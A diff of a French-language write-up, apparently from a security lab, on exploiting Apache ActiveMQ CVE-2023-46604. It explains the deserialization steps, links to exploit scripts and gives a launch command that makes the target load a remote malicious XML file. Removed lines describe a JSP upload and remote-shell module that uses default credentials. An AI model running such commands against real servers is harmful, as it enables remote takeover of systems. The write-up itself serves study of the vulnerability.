@@ -22,17 +22,30 @@ La vulnérabilité **CVE-2023-46604** est associée à cette version d'ActiveMQ.
 ![activemq_2023_cve](https://github.com/user-attachments/assets/d7a87a84-a605-4370-84e1-c7bf30a4d1b2)
 
 ## Stratégie de Compromission
-Cette section détaille la stratégie de compromission pour exploiter cette vulnérabilité.
 
----
+[Stratégie de compromission](compromission2023.py)
+[Stratégie de compromission xml](compromission2023.xml)
 
-### Exploitation/Explication
+## Exploitation/Explication
 
-#### 1. Objectif du Module
-Ce module permet de téléverser un fichier JSP malveillant en contournant les restrictions de chemin via une technique `..//`. Il permet également d'obtenir un accès shell à distance.
+### Objectif du Module
+Le module utilise une vulnérabilité critique dans ActiveMQ, permettant l'exécution de code à distance (CVSS de 9.8 à 10.0). En envoyant un fichier XML malveillant, l'attaquant peut exécuter du code arbitraire et compromettre le serveur.
 
-#### 2. Fonctionnement
-1. Utilisation des identifiants par défaut (**admin:admin**).
-2. Vérification de la vulnérabilité de la cible.
-3. Téléversement du payload JSP puis exécution de ce dernier.
-4. Accès obtenu au shell.
+### Fonctionnement
+
+1. **Connexion au Serveur** : Le script se connecte au serveur ActiveMQ via une connexion socket à l’adresse IP et au port spécifiés (ex. `61616`).
+
+2. **Envoi du Payload** : Le script envoie un flux de données binaires contenant le nom d'une classe Java (`ClassPathXmlApplicationContext`) et l'URL d’un fichier XML malveillant (`poc.xml`).
+
+3. **Chargement du Fichier XML** : Le serveur charge le fichier XML distant qui contient le code malveillant, permettant l'exécution de commandes sur le serveur ActiveMQ.
+
+### Exemple d'Exploitation
+
+Lancer l'attaque avec :
+
+```bash
+python3 exploit.py 127.0.0.1 61616 http://192.168.0.101:8888/poc.xml
+```
+
+### Impact
+L'exploitation réussie permet à l'attaquant de prendre le contrôle du serveur, avec des impacts majeurs sur la confidentialité, l'intégrité et la disponibilité du système.
